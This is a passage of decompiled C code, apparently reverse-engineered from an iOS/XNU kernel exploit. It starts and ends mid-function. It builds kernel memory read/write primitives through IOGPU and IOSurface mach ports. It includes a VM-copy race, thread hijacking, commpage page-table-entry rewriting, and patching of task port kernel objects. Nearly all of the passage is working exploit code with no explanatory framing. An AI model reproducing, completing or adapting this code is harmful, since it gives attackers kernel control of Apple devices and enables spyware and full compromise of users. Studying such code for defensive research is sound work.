  semaphore_timedwait_ns(krwCtx, 0x1312D0u);
  if ( !kread_physmap_decorated(krwCtx, dispatchTargetSlot, (unsigned __int64 *)&dispatchTarget) )
    return 163855;

  doubledPatchCount = 0;
  if ( !validate_kaddr_range(krwCtx, dispatchTarget)
    && !(unsigned int)kwrite_with_retry(krwCtx, patchGateSlot, (__int64)&doubledPatchCount, 4) )
  {
    return 163856;
  }

  if ( (unsigned int)krw_read_thunk(krwCtx, patchCountSlot, 4, &patchCount) )
    return 0;
  return 163855;
}
// A0A0: too many cbuild loops

//----- (000000000000A354) ----------------------------------------------------
__int64 __fastcall iogpu_kread(struct_krwCtx *krwCtx, __int16 a2, char *a3, unsigned int a4, int a5)
{
  uint64_t *v5; // x21
  __int64 result; // x0
  int v10; // [xsp+Ch] [xbp-24h] BYREF

  v10 = -1;
  v5 = krwCtx->iogpuCtx;
  if ( !v5 )
    return 708609;
  if ( a5 )
  {
    result = fd_open_dev_null(&v10);
    if ( (uint32_t)result )
      return result;
    iogpu_kread_loop(v5, a2, a3, a4);
    fd_close(v10);
  }
  else
  {
    iogpu_kread_loop((uint64_t *)krwCtx->iogpuCtx, a2, a3, a4);
  }
  return 0;
}

//----- (000000000000A3F0) ----------------------------------------------------
__int64 __fastcall iogpu_kwrite(struct_krwCtx *krwCtx, __int16 a2, char *a3, unsigned int a4, int a5)
{
  uint64_t *v5; // x21
  __int64 result; // x0
  int v10; // [xsp+Ch] [xbp-24h] BYREF

  v10 = -1;
  v5 = (uint64_t *)krwCtx->iogpuCtx;
  if ( !v5 )
    return 708609;
  if ( a5 )
  {
    result = fd_open_dev_null(&v10);
    if ( (uint32_t)result )
      return result;
    iogpu_kwrite_loop(v5, a3, a2, a4);
    fd_close(v10);
  }
  else
  {
    iogpu_kwrite_loop((uint64_t *)krwCtx->iogpuCtx, a3, a2, a4);
  }
  return 0;
}

//----- (000000000000A48C) ----------------------------------------------------
__int64 __fastcall iogpu_kread2(struct_krwCtx *krwCtx, unsigned __int64 a2, void *a3, unsigned int a4, int a5)
{
  __int64 result; // x0
  uint64_t *v7; // x21
  size_t v10; // x22
  int v11; // [xsp+Ch] [xbp-24h] BYREF

  result = 708609;
  v11 = -1;
  v7 = (uint64_t *)krwCtx->iogpuCtx;
  if ( v7 && (vm_page_mask & a2) + a4 <= vm_page_size )
  {
    v10 = a4;
    if ( a5 )
    {
      result = fd_open_dev_null(&v11);
      if ( (uint32_t)result )
        return result;
      physmap_read_aligned(v7, a2, a3, v10);
      fd_close(v11);
    }
    else
    {
      physmap_read_aligned(v7, a2, a3, a4);
    }
    return 0;
  }
  return result;
}

//----- (000000000000A550) ----------------------------------------------------
__int64 __fastcall iogpu_kwrite2(struct_krwCtx *krwCtx, unsigned __int64 a2, const void *a3, unsigned int a4, int a5)
{
  __int64 result; // x0
  uint64_t *v7; // x21
  size_t v10; // x22
  int v11; // [xsp+Ch] [xbp-24h] BYREF

  result = 708609;
  v11 = -1;
  v7 = (uint64_t *)krwCtx->iogpuCtx;
  if ( v7 && (vm_page_mask & a2) + a4 <= vm_page_size )
  {
    v10 = a4;
    if ( a5 )
    {
      result = fd_open_dev_null(&v11);
      if ( (uint32_t)result )
        return result;
      physmap_write_aligned(v7, a3, a2, v10);
      fd_close(v11);
    }
    else
    {
      physmap_write_aligned(v7, a3, a2, a4);
    }
    return 0;
  }
  return result;
}

//----- (000000000000A614) ----------------------------------------------------
__int64 __fastcall setup_kernel_region_via_flags(struct_krwCtx *krwCtx)
{
  __int64 v2; // x21
  int v3; // w8
  __int128 v4; // q0
  uint64_t *v5; // x0
  uint64_t *v6; // x20
  uint64_t *v7; // x21
  __int128 v8; // q0
  __int128 v10; // [xsp+0h] [xbp-40h]
  __int128 v11; // [xsp+10h] [xbp-30h]

  v2 = 708616;
  if ( !krw_ctx_has_flag(krwCtx, KRW_CTX_FLAG_PAC_KERNEL_LAYOUT) )
    return v2;
  v3 = krwCtx->flags & KRW_CTX_FLAG_CPU_A8_TO_A17_MASK;
  if ( v3 == 0x100000 )
  {
    v10 = xmmword_42D80;
    v11 = xmmword_42D90;
  }
  else
  {
    if ( v3 == 0x4000000 )
    {
      v11 = xmmword_42D70;
      v4 = xmmword_42D60;
    }
    else
    {
      if ( v3 != 0x1000000 )
        return v2;
      v11 = xmmword_42D70;
      v4 = xmmword_42DA0;
    }
    v10 = v4;
  }
  v5 = calloc(1u, 0x5E8u);
  if ( !v5 )
    return 708617;
  v6 = v5;
  if ( _os_alloc_once_table[162] == -1 )
    v7 = (uint64_t *)_os_alloc_once_table[163];
  else
    v7 = (uint64_t *)_os_alloc_once(&_os_alloc_once_table[162], 0x10u, 0);
  if ( *v7 )
    v6[2] = *v7;
  *(__int128 *)(v6 + 179) = v11;
  *(__int128 *)(v6 + 181) = v10;
  if ( (uint64_t)v11 == 16 )
  {
    v8 = xmmword_42D40;
    goto LABEL_19;
  }
  if ( (uint64_t)v11 == 64 )
  {
    v8 = xmmword_42D50;
LABEL_19:
    *(__int128 *)(v6 + 187) = v8;
  }
  setup_thread_policy();
  physmap_vmregion_init(v6);
  dequeue_multiple_physmap_entries(v6);
  run_physmap_setup_sequence(v6);
  validate_physmap_range_3(v6);
  setup_physmap_copy_structure(v6);
  v6[186] = (uint64_t)krwCtx;
  if ( !*v7 )
    *v7 = v6[2];
  v2 = 0;
  *(uint64_t *)&krwCtx->iogpuKreadFn = (uint64_t)iogpu_kread;
  *(uint64_t *)&krwCtx->iogpuKwriteFn = (uint64_t)iogpu_kwrite;
  *(uint64_t *)&krwCtx->iogpuKread2Fn = (uint64_t)iogpu_kread2;
  *(uint64_t *)&krwCtx->iogpuKwrite2Fn = (uint64_t)iogpu_kwrite2;
  *(uint64_t *)&krwCtx->iogpuCtx = (uint64_t)v6;
  v6[183] = read_task_kobject_physmap;
  v6[184] = get_read_task_port_kobject;
  v6[185] = check_task_port_type;
  *(uint64_t *)&krwCtx->gap_0x1E0 = (uint64_t)necp_send_msg_1;
  *(uint64_t *)&krwCtx->gap_0x1E8 = (uint64_t)v6;
  return v2;
}
// 42D40: using guessed type __int128 xmmword_42D40;
// 42D50: using guessed type __int128 xmmword_42D50;
// 42D60: using guessed type __int128 xmmword_42D60;
// 42D70: using guessed type __int128 xmmword_42D70;
// 42D80: using guessed type __int128 xmmword_42D80;
// 42D90: using guessed type __int128 xmmword_42D90;
// 42DA0: using guessed type __int128 xmmword_42DA0;

//----- (000000000000A82C) ----------------------------------------------------
__int64 __fastcall read_task_kobject_physmap(struct_krwCtx *krwCtx, unsigned __int64 a2)
{
  __int64 result; // x0
  unsigned __int64 v4; // x20
  bool v5; // zf
  uint64_t v6; // [xsp+8h] [xbp-18h] BYREF

  result = traverse_sptm_pgtable_chain(krwCtx, mach_task_self_, a2);
  if ( result )
  {
    v4 = result + 56;
    result = kread64_internal(krwCtx, result + 56, &v6);
    if ( (uint32_t)result )
      v5 = v6 == 0;
    else
      v5 = 1;
    if ( !v5 )
      return kwrite_physmap_with_a3_ptr(krwCtx, v4, 0);
  }
  return result;
}

//----- (000000000000A8A0) ----------------------------------------------------
__int64 __fastcall get_read_task_port_kobject(struct_krwCtx *krwCtx, mach_port_t a2)
{
  __int64 result; // x0
  unsigned __int64 v4; // x20
  uint64_t v5; // [xsp+8h] [xbp-18h] BYREF

  result = get_task_kobject_addr(krwCtx, a2);
  if ( result )
  {
    result = walk_kaddr_chain_to_target(krwCtx, result, 1);
    if ( result )
    {
      v4 = result + 56;
      result = kread64_internal(krwCtx, result + 56, &v5);
      if ( (uint32_t)result )
      {
        if ( v5 )
          return kwrite_physmap_with_a3_ptr(krwCtx, v4, 0);
      }
    }
  }
  return result;
}

//----- (000000000000A914) ----------------------------------------------------
unsigned __int64 __fastcall check_task_port_type(__int64 krwCtx, unsigned __int64 a2)
{
  unsigned __int64 result; // x0
  mach_vm_address_t vaddr; // x20
  bool v5; // zf
  int v6; // [xsp+4h] [xbp-1Ch] BYREF
  unsigned __int64 v7; // [xsp+8h] [xbp-18h] BYREF

  v7 = 0;
  v6 = 0;
  result = scan_and_validate_kaddr(krwCtx, mach_task_self_, a2, &v7);
  if ( result )
  {
    vaddr = result + 40;
    result = kread_u32(krwCtx, result + 40, &v6);
    if ( (uint32_t)result )
      v5 = v6 == 1;
    else
      v5 = 0;
    if ( v5 )
    {
      v6 = 100;
      return noppl_kwrite32(krwCtx, vaddr, 100);
    }
  }
  return result;
}

//----- (000000000000A99C) ----------------------------------------------------
__int64 __fastcall free_iogpu_krw_ctx(struct_krwCtx *krwCtx)
{
  __int64 v1; // x0

  v1 = krwCtx->iogpuCtx;
  if ( !v1 )
    return 708609;
  free_vm_page_array_list(v1);
  return 0;
}

//----- (000000000000A9CC) ----------------------------------------------------
__int64 __fastcall iogpu_teardown_ctx(struct_krwCtx *krwCtx)
{
  vm_address_t *v1; // x20
  __int64 result; // x0
  int v4; // [xsp+Ch] [xbp-14h] BYREF

  v4 = -1;
  v1 = krwCtx->iogpuCtx;
  if ( !v1 )
    return 708609;
  result = fd_open_dev_null(&v4);
  if ( !(uint32_t)result )
  {
    krwCtx->iogpuCtx = 0;
    krwCtx->iogpuKreadFn = 0;
    krwCtx->iogpuKread2Fn = 0;
    krwCtx->iogpuKwriteFn = 0;
    krwCtx->iogpuKwrite2Fn = 0;
    teardown_iogpu_vm_copy(v1);
    fd_close(v4);
    return 0;
  }
  return result;
}

//----- (000000000000AA3C) ----------------------------------------------------
__int64 __fastcall create_iogpu_shmem_entry(struct_krwCtx *krwCtx, uint32_t *a2, uint32_t *a3, mach_port_t *a4, uint64_t *a5)
{
  uint64_t *v5; // x25
  __int64 v11; // x19
  memory_object_offset_t v12; // x2
  kern_return_t memory_entry_64; // w0
  memory_object_size_t size; // [xsp+8h] [xbp-58h] BYREF
  mach_port_t name; // [xsp+14h] [xbp-4Ch] BYREF
  mach_port_t object_handle[2]; // [xsp+18h] [xbp-48h] BYREF

  *(uint64_t *)object_handle = 0;
  name = 0;
  v5 = (uint64_t *)krwCtx->iogpuCtx;
  if ( !v5 )
    return 708609;
  v11 = 163857;
  if ( validate_kaddr_range(krwCtx, v5[163]) )
  {
    if ( v5[164] && v5[165] )
    {
      if ( validate_kaddr_range(krwCtx, v5[166]) && validate_kaddr_range(krwCtx, v5[167]) )
      {
        v12 = v5[170];
        if ( v12 && v5[172] && v5[175] )
        {
          size = 0x4000;
          memory_entry_64 = mach_make_memory_entry_64(mach_task_self_, &size, v12, 3, &object_handle[1], 0);
          if ( memory_entry_64
            || (size = 0x4000,
                (memory_entry_64 = mach_make_memory_entry_64(mach_task_self_, &size, v5[172], 3, object_handle, 0)) != 0)
            || (size = 0x4000,
                (memory_entry_64 = mach_make_memory_entry_64(mach_task_self_, &size, v5[175] + 0x4000LL, 3, &name, 0)) != 0) )
          {
            v11 = memory_entry_64 | 0x80000000;
          }
          else
          {
            v11 = 0;
            a5[10] = v5[163];
            a5[11] = 0;
            a5[12] = v5[164];
            a5[13] = v5[165];
            a5[14] = v5[166];
            a5[15] = v5[167];
            *a2 = object_handle[1];
            *a3 = object_handle[0];
            *(uint64_t *)object_handle = 0;
            *a4 = name;
            name = 0;
          }
        }
      }
      else
      {
        v11 = 163878;
      }
    }
  }
  else
  {
    v11 = 163878;
  }
  if ( object_handle[1] + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, object_handle[1]);
  if ( object_handle[0] + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, object_handle[0]);
  if ( name + 1 >= 2 )
    mach_port_deallocate(mach_task_self_, name);
  return v11;
}

//----- (000000000000AC50) ----------------------------------------------------
__int64 __fastcall iogpu_physmap_init(struct_krwCtx *krwCtx)
{
  vm_size_t v2; // x20
  kern_return_t memory_entry; // w0
  __int64 result; // x0
  uint64_t *v5; // x4
  __int64 v6; // x0
  uint32_t *v7; // x20
  __int64 i; // x23
  unsigned int v9; // w21
  __int64 v10; // x0
  mem_entry_name_port_t object_handle; // [xsp+Ch] [xbp-94h] BYREF
  vm_address_t address; // [xsp+10h] [xbp-90h] BYREF
  vm_size_t size; // [xsp+18h] [xbp-88h] BYREF
  mach_port_t v15; // [xsp+3Ch] [xbp-64h] BYREF
  __int64 v16; // [xsp+40h] [xbp-60h] BYREF
  uint32_t v17[4]; // [xsp+48h] [xbp-58h]

  v16 = 0;
  v15 = 0;
  v2 = vm_page_size;
  address = 0;
  size = vm_page_size;
  memory_entry = mach_make_memory_entry(mach_task_self_, &size, 0, 131075, &object_handle, 0);
  if ( memory_entry )
    return memory_entry | 0x80000000;
  memory_entry = vm_map(mach_task_self_, &address, v2, 0, 1, object_handle, 0, 0, 3, 3, 2u);
  if ( memory_entry )
    return memory_entry | 0x80000000;
  bzero((void *)address, v2);
  v5 = (uint64_t *)address;
  *(uint64_t *)address = krwCtx->gap_0x19D8;
  v5[4] = krwCtx->iogpuKobjPtr2;
  v5[5] = LODWORD(krwCtx->iogpuObjCount);
  result = create_iogpu_shmem_entry(krwCtx, (uint32_t *)&v16 + 1, &v16, &v15, v5);
  if ( !(uint32_t)result )
  {
    vm_deallocate(mach_task_self_, address, v2);
    v17[0] = object_handle;
    v17[1] = HIDWORD(v16);
    v17[2] = v16;
    v17[3] = v15;
    v6 = iosurface_enum_mach_port(krwCtx, kIogpuMachPortSelectors[0]);
    if ( v6 )
    {
      v7 = (uint32_t *)v6;
      for ( i = 0; ; ++i )
      {
        v9 = v17[i];
        v10 = task_self_get_ipc_port(krwCtx, v9);
        if ( !v10 )
          return 163854;
        result = kread_and_vm_attr_double(krwCtx, v10);
        if ( (uint32_t)result )
          return result;
        memory_entry = mach_port_mod_refs(mach_task_self_, v9, 0, 0xFFFF);
        if ( memory_entry )
          return memory_entry | 0x80000000;
        *v7 = v9;
        if ( i == 3 )
          break;
        v7 = (uint32_t *)iosurface_enum_mach_port(krwCtx, kIogpuMachPortSelectors[i + 1]);
        result = 4097;
        if ( !v7 )
          return result;
      }
      return iosurface_check_and_alloc_port(krwCtx);
    }
    else
    {
      return 4097;
    }
  }
  return result;
}
//----- (000000000000AE58) ----------------------------------------------------
__int64 __fastcall iogpu_init_private_ctx(
                                          struct_krwCtx *krwCtx,
        uint64_t *a2,
        mem_entry_name_port_t a3,
        mem_entry_name_port_t a4,
        mem_entry_name_port_t a5,
        uint64_t *a6)
{
  __int64 status; // x24
  uint64_t objectKaddr; // x20
  uint64_t pageAlignedSize; // x28
  uint64_t srcPhys; // x21
  uint64_t dstKaddr; // [xsp+20h] [xbp-A0h]
  uint64_t auxKaddr; // x22
  kern_return_t kr; // w0
  IogpuPrivateCtx *privateCtx; // x0
  vm_address_t stagedMirror; // x9
  vm_address_t fixedPage; // [xsp+28h] [xbp-98h] BYREF
  vm_address_t auxMap; // [xsp+48h] [xbp-78h] BYREF
  vm_address_t mirrorMap; // [xsp+50h] [xbp-70h] BYREF
  vm_address_t srcMap; // [xsp+58h] [xbp-68h] BYREF
  vm_address_t targetMap; // [xsp+60h] [xbp-60h] BYREF
  vm_address_t scratchMap; // [xsp+68h] [xbp-58h] BYREF

  status = 163857;
  scratchMap = 0;
  srcMap = 0;
  targetMap = 0;
  auxMap = 0;
  mirrorMap = 0;

  objectKaddr = a6[10];
  if ( !validate_kaddr_range(krwCtx, objectKaddr) )
    return 163878;

  pageAlignedSize = a6[12];
  if ( !pageAlignedSize || (krwCtx->pageMask & pageAlignedSize) != 0 )
    goto cleanup;

  srcPhys = a6[13];
  if ( !srcPhys )
    goto cleanup;

  status = 163878;
  dstKaddr = a6[14];
  if ( !validate_kaddr_range(krwCtx, dstKaddr) )
    goto cleanup;

  auxKaddr = a6[15];
  if ( !validate_kaddr_range(krwCtx, auxKaddr) )
    goto cleanup;

  kr = vm_allocate(mach_task_self_, &scratchMap, 0xC000u, 1);
  if ( kr )
    goto mach_error;
  kr = iogpu_allocate_fixed(&scratchMap, 0x4000u, 16386);
  if ( kr )
    goto mach_error;
  kr = iogpu_remap_self_page(&scratchMap);
  if ( kr )
    goto mach_error;
  fixedPage = scratchMap + 0x4000;
  kr = iogpu_allocate_fixed(&fixedPage, 0x8000u, 0x4000);
  if ( kr )
    goto mach_error;

  kr = vm_allocate(mach_task_self_, &targetMap, 0xC000u, 1);
  if ( kr )
    goto mach_error;
  kr = iogpu_map_memory_entry_fixed(&targetMap, a3);
  if ( kr )
    goto mach_error;
  kr = iogpu_remap_self_page(&targetMap);
  if ( kr )
    goto mach_error;
  fixedPage = targetMap + 0x4000;
  kr = iogpu_allocate_fixed(&fixedPage, 0x8000u, 0x4000);
  if ( kr )
    goto mach_error;
  kr = vm_copy(mach_task_self_, targetMap, 0xC000u, scratchMap);
  if ( kr )
    goto mach_error;

  kr = vm_allocate(mach_task_self_, &srcMap, 0xC000u, 1);
  if ( kr )
    goto mach_error;
  kr = iogpu_map_memory_entry_fixed(&srcMap, a4);
  if ( kr )
    goto mach_error;
  kr = iogpu_remap_self_page(&srcMap);
  if ( kr )
    goto mach_error;
  fixedPage = srcMap + 0x4000;
  kr = iogpu_allocate_fixed(&fixedPage, 0x4000u, 16386);
  if ( kr )
    goto mach_error;
  kr = iogpu_remap_self_page(&fixedPage);
  if ( kr )
    goto mach_error;

  kr = vm_allocate(mach_task_self_, &mirrorMap, 0xC000u, 1);
  if ( kr )
    goto mach_error;
  kr = iogpu_allocate_fixed(&mirrorMap, 0x4000u, 16386);
  if ( kr )
    goto mach_error;
  kr = iogpu_remap_self_page(&mirrorMap);
  if ( kr )
    goto mach_error;
  fixedPage = mirrorMap + 0x4000;
  kr = iogpu_allocate_fixed(&fixedPage, 0x4000u, 16386);
  if ( kr )
    goto mach_error;
  kr = iogpu_remap_self_page(&fixedPage);
  if ( kr )
    goto mach_error;

  kr = vm_allocate(mach_task_self_, &auxMap, 0xC000u, 1);
  if ( kr )
    goto mach_error;
  kr = iogpu_allocate_fixed(&auxMap, 0x4000u, 16386);
  if ( kr )
    goto mach_error;
  kr = iogpu_remap_self_page(&auxMap);
  if ( kr )
    goto mach_error;
  fixedPage = auxMap + 0x4000;
  kr = iogpu_map_memory_entry_fixed(&fixedPage, a5);
  if ( kr )
    goto mach_error;
  kr = iogpu_remap_self_page(&fixedPage);
  if ( kr )
    goto mach_error;

  privateCtx = calloc(1u, sizeof(*privateCtx));
  if ( !privateCtx )
  {
    status = 708617;
    goto cleanup;
  }

  status = 0;
  privateCtx->descriptorObjectKaddr = objectKaddr;
  privateCtx->mappedObjectSize = pageAlignedSize;
  privateCtx->sourcePhys = srcPhys;
  privateCtx->destinationKaddr = dstKaddr;
  privateCtx->auxKaddr = auxKaddr;
  privateCtx->scratchMap = scratchMap;
  stagedMirror = srcMap;
  privateCtx->targetMap = targetMap;
  privateCtx->targetMapSize = 49152;
  scratchMap = 0;
  srcMap = 0;
  targetMap = 0;
  privateCtx->sourceMap = stagedMirror;
  privateCtx->mirrorMap = mirrorMap;
  privateCtx->mirrorMapSize = 49152;
  privateCtx->auxMap = auxMap;
  privateCtx->sourceMapAlias = stagedMirror;
  privateCtx->sourceMapSize = 49152;
  auxMap = 0;
  mirrorMap = 0;
  *a2 = (uint64_t)privateCtx;
  goto cleanup;

mach_error:
  status = kr | 0x80000000;

cleanup:
  if ( srcMap )
    vm_deallocate(mach_task_self_, srcMap, 0xC000u);
  if ( mirrorMap )
    vm_deallocate(mach_task_self_, mirrorMap, 0xC000u);
  if ( auxMap )
    vm_deallocate(mach_task_self_, auxMap, 0xC000u);
  if ( scratchMap )
    vm_deallocate(mach_task_self_, scratchMap, 0xC000u);
  if ( targetMap )
    vm_deallocate(mach_task_self_, targetMap, 0xC000u);
  return status;
}

//----- (000000000000B460) ----------------------------------------------------
__int64 __fastcall iogpu_krw_ctx_setup(struct_krwCtx *krwCtx, uint32_t *a2)
{
  vm_size_t v2; // x20
  __int64 result; // x0
  int v6; // w22
  mach_port_name_t *v7; // x0
  __int64 v8; // x23
  mach_port_name_t v9; // w1
  __int64 i; // x21
  mach_port_name_t v11; // w1
  bool v12; // zf
  __int64 v13; // x23
  __int64 v14; // x23
  uint64_t *v15; // x5
  __int64 v16; // x8
  __int64 v17; // x8
  uint64_t v18; // [xsp+18h] [xbp-88h] BYREF
  int v20; // [xsp+3Ch] [xbp-64h] BYREF
  vm_address_t address; // [xsp+40h] [xbp-60h] BYREF
  mem_entry_name_port_t object[4]; // [xsp+48h] [xbp-50h]

  *(uint64_t *)object = 0;
  *(uint64_t *)&object[2] = 0;
  address = 0;
  v2 = vm_page_size;
  v20 = -1;
  if ( krwCtx->xnuVersionPacked < XNU_VERSION_PACKED(8020, 241, 8, 0, 0) )
    return 708609;
  result = fd_open_dev_null(&v20);
  if ( !(uint32_t)result )
  {
    v6 = 163878;
    v7 = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, kIogpuMachPortSelectors[0]);
    if ( v7 )
    {
      v8 = 0;
      do
      {
        v9 = *v7;
        object[v8] = *v7;
        if ( v9 + 1 < 2 || mach_port_mod_refs(mach_task_self_, v9, 0, 1) )
          break;
        if ( v8 == 3 )
        {
          if ( !vm_map(mach_task_self_, &address, v2, 0, 1, object[0], 0, 0, 3, 3, 2u) )
          {
            v13 = *(uint64_t *)address;
            if ( validate_kaddr_range(krwCtx, *(uint64_t *)address) )
            {
              krwCtx->gap_0x19D8 = v13;
              v14 = *(uint64_t *)(address + 32);
              if ( validate_kaddr_range(krwCtx, v14) )
              {
                krwCtx->iogpuKobjPtr2 = v14;
                v15 = (uint64_t *)address;
                v16 = *(uint64_t *)(address + 40);
                if ( (unsigned __int64)(v16 - 1) <= 0x1F )
                {
                  LODWORD(krwCtx->iogpuObjCount) = v16;
                  v18 = 0;
                  v6 = iogpu_init_private_ctx(krwCtx, &v18, object[1], object[2], object[3], v15);
                  if ( !v6 )
                  {
                    v17 = v18;
                    *(uint64_t *)&krwCtx->iogpuKreadFn = (uint64_t)iogpu_kread;
                    *(uint64_t *)&krwCtx->iogpuKwriteFn = (uint64_t)iogpu_kwrite;
                    *(uint64_t *)&krwCtx->iogpuKread2Fn = (uint64_t)iogpu_kread2;
                    *(uint64_t *)&krwCtx->iogpuKwrite2Fn = (uint64_t)iogpu_kwrite2;
                    *(uint64_t *)&krwCtx->iogpuCtx = v17;
                    fd_close(v20);
                    v20 = -1;
                    v6 = krw_read_validation(krwCtx, 0);
                    if ( !v6 )
                    {
                      *(uint64_t *)&krwCtx->iogpuKreadFn = 0;
                      v6 = krw_write_validation(krwCtx);
                      if ( !v6 )
                        *(uint64_t *)&krwCtx->iogpuKwriteFn = 0;
                    }
                  }
                }
              }
            }
          }
          break;
        }
        v7 = (mach_port_name_t *)iosurface_enum_mach_port(krwCtx, kIogpuMachPortSelectors[v8 + 1]);
        ++v8;
      }
      while ( v7 );
    }
    if ( v20 != -1 )
      fd_close(v20);
    if ( v6 )
    {
      for ( i = 0; i != 4; ++i )
      {
        v11 = object[i];
        if ( v11 + 1 >= 2 )
          mach_port_deallocate(mach_task_self_, v11);
      }
    }
    if ( address )
      v12 = v2 == 0;
    else
      v12 = 1;
    if ( !v12 )
      vm_deallocate(mach_task_self_, address, v2);
    result = 0;
    *a2 = v6 == 0;
  }
  return result;
}
//----- (000000000000B73C) ----------------------------------------------------
__int64 __fastcall get_iogpu_physmap_base(struct_krwCtx *krwCtx)
{
  IogpuPrivateCtx *privateCtx; // x8

  privateCtx = (IogpuPrivateCtx *)krwCtx->iogpuCtx;
  if ( privateCtx )
    return privateCtx->auxKaddr;
  else
    return 708609LL;
}

//----- (000000000000B758) ----------------------------------------------------
void memory_barrier_dsb_isb()
{
  __dsb(0xFu);
  __isb(0xFu);
}

//----- (000000000000B768) ----------------------------------------------------
__int64 __fastcall iogpu_kernel_read_op(struct_krwCtx *krwCtx, unsigned __int64 a2, int a3)
{
  __int64 fallbackError; // x24
  __int64 status; // x22
  unsigned __int64 port_kaddr; // x0
  unsigned __int64 aliasPage; // x23
  __int64 mappedKernelRegion; // x8
  int physAllocSize; // [xsp+4h] [xbp-3ACh] BYREF
  PgtableWalkInfo secondAliasWalk; // [xsp+8h] [xbp-3A8h] BYREF
  PgtableWalkInfo firstAliasWalk; // [xsp+30h] [xbp-380h] BYREF
  struct
  {
    uint64_t scanCtx;
    uint64_t vmcopyCtx;
    int flags;
  } hijackArgs; // [xsp+58h] [xbp-358h] BYREF
  uint64_t *sectionCtx[3]; // [xsp+70h] [xbp-340h] BYREF
  uint64_t kernelScanCtx[5]; // [xsp+88h] [xbp-328h] BYREF
  union
  {
    struct
    {
      uint64_t dispatchTable;
      uint64_t scanCtx;
    } vmcopy;
    PgtableWalkInfo walk;
  } vmcopyOrWalk; // [xsp+B0h] [xbp-300h] BYREF

  memset(&secondAliasWalk, 0, sizeof(secondAliasWalk));
  memset(&firstAliasWalk, 0, sizeof(firstAliasWalk));
  memset(&vmcopyOrWalk.walk, 0, sizeof(vmcopyOrWalk.walk));
  fallbackError = 708619;
  if ( !(unsigned int)acquire_write_semaphore_lock(krwCtx, 7u, 0x2710u) )
  {
    mappedKernelRegion = *(uint64_t *)&krwCtx->mappedKernelRegion;
    if ( mappedKernelRegion && *(uint64_t *)&krwCtx->mappedKernelSize )
    {
      aliasPage = *(uint64_t *)(mappedKernelRegion + 344);
      if ( aliasPage )
        goto WRITE_WITH_ALIAS_PAGE;
    }

    sectionCtx[2] = kernelScanCtx;
    vmcopyOrWalk.vmcopy.dispatchTable = (uint64_t)off_448E0;
    vmcopyOrWalk.vmcopy.scanCtx = (uint64_t)kernelScanCtx;
    if ( !(unsigned int)parse_xnu_version_string((__int64)&qword_480D8) )
    {
      status = 163878;
      kernelScanCtx[4] = (uint64_t)krwCtx;
      scan_for_macho_header(kernelScanCtx, krwCtx->gap_0x19D0);
      port_kaddr = get_task_kobject_addr(krwCtx, mach_task_self_);
      kernelScanCtx[2] = port_kaddr;
      if ( !port_kaddr || (kernelScanCtx[3] = kreadptr(krwCtx, port_kaddr)) == 0 )
      {
        fallbackError = 163867;
      }
      else if ( !(unsigned int)init_text_exec_data_const_sections(sectionCtx)
             && !(unsigned int)setup_iokit_notify_dispatch(&qword_48000, sectionCtx) )
      {
        hijackArgs.scanCtx = (uint64_t)kernelScanCtx;
        hijackArgs.vmcopyCtx = (uint64_t)&vmcopyOrWalk;
        hijackArgs.flags = 0;
        if ( (unsigned int)exploit_thread_vmcopy_race((__int64)&vmcopyOrWalk)
          || (unsigned int)krw_ctx_setup_physmap((__int64)&gPhysmapGadgets, sectionCtx, (__int64)kernelScanCtx)
          || (unsigned int)thread_hijack_exploit((__int64)&hijackArgs) )
        {
          get_ppnum_via_kread((__int64)&vmcopyOrWalk);
          status = 708619;
          goto RELEASE_LOCK;
        }

        get_ppnum_via_kread((__int64)&vmcopyOrWalk);
        physAllocSize = 2 * krwCtx->pageSizeOrSomething;
        aliasPage = alloc_physmap_page(krwCtx, (unsigned int *)&physAllocSize);
        if ( !aliasPage )
        {
          status = 708617;
          goto RELEASE_LOCK;
        }
        if ( !pgtable_walk_wrapper(krwCtx, aliasPage, &firstAliasWalk) )
          goto RELEASE_LOCK;
        if ( !pgtable_walk_wrapper(krwCtx, aliasPage + krwCtx->pageSizeOrSomething, &secondAliasWalk) )
          goto RELEASE_LOCK;

        __int64 mappedSecondAliasPage = map_physpage_for_kobj(krwCtx, secondAliasWalk.tableKva);
        if ( !mappedSecondAliasPage )
          goto RELEASE_LOCK;

        uint64_t pageMask = krwCtx->pageMask;
        if ( pgtable_walk_wrapper(krwCtx, firstAliasWalk.tableKva & ~pageMask, &vmcopyOrWalk.walk)
          && (vmcopyOrWalk.walk.descriptor & 0xFFFFFFFFC000LL) != 0 )
        {
          uint64_t savedCommPagePte = MEMORY[0x400000008];
          uint64_t commPagePte = (savedCommPagePte & 0xFFFF000000003FFFLL)
                               | (vmcopyOrWalk.walk.descriptor & 0xFFFFFFFFC000LL);
          MEMORY[0x400000008] = commPagePte;
          memory_barrier_dsb_isb();
          semaphore_timedwait_ns(krwCtx, 0x2710u);
          *(uint64_t *)((firstAliasWalk.tableKva & 0x3FFF) | 0x400004000LL) =
            (firstAliasWalk.descriptor & 0xFFFF000000003FFFLL)
          | ((((mappedSecondAliasPage & (unsigned __int64)~pageMask) >> 14) & 0x3FFFFFFFFLL) << 14);
          memory_barrier_dsb_isb();
          MEMORY[0x400000008] = savedCommPagePte;
          semaphore_timedwait_ns(krwCtx, 0x2710u);
          mappedKernelRegion = *(uint64_t *)&krwCtx->mappedKernelRegion;
          if ( mappedKernelRegion && *(uint64_t *)&krwCtx->mappedKernelSize )
            *(uint64_t *)(mappedKernelRegion + 344) = aliasPage;
          goto WRITE_WITH_ALIAS_PAGE;
        }
        status = 708619;
        goto RELEASE_LOCK;
      }
    }
    status = fallbackError;
    goto RELEASE_LOCK;

WRITE_WITH_ALIAS_PAGE:
    status = 163878;
    if ( pgtable_walk_wrapper(krwCtx, a2, &vmcopyOrWalk.walk) )
    {
      if ( (uint8_t)vmcopyOrWalk.walk.kindAndFlags == 3 )
      {
        uint64_t aliasPteSlot =
          aliasPage + 8 * (((krwCtx->pageSizeOrSomething + (uint32_t)aliasPage) & 0x1FFFFFFu)
                         / krwCtx->pageSizeOrSomething);
        if ( (unsigned int)krw_read_thunk(krwCtx, aliasPteSlot, 8, kernelScanCtx) )
        {
          uint64_t retargetedPte =
            (kernelScanCtx[0] & 0xFFFF000000003FFFLL)
          | (((vmcopyOrWalk.walk.descriptor >> 14) & 0x3FFFFFFFFLL) << 14);
          if ( retargetedPte == kernelScanCtx[0]
            || (unsigned int)kwrite_with_retry(krwCtx, aliasPteSlot, (__int64)&retargetedPte, 8) )
          {
            if ( retargetedPte != kernelScanCtx[0] )
              semaphore_timedwait_ns(krwCtx, 0x2710u);
